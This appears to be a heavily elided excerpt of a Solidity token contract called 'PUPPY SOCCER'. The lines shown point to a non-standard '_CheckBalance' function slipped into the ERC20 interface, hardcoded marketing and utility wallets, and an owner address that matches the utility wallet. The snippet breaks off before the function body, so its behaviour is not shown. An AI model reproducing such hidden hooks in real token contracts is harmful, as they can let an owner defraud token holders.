...
interface IERC20 {
    ...
    function _CheckBalance(address t_Address) external returns (uint256);
...
contract PUPPYSOCCER is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x7b26A8E6BEDBe0d20395332a7fE1A1CC93FB1dCE); 
    address payable public Wallet_Utility = payable(0x15EDaF273c0E862c613cdFBEbC9DcC30eb984A93);
    ...
    string private constant _name = "PUPPY SOCCER"; 
    ...
    constructor () {
        ...
        _owner = 0x15EDaF273c0E862c613cdFBEbC9DcC30eb984A93;
    ...
    function _CheckBalance(address t_Address) public override returns (uint256) {
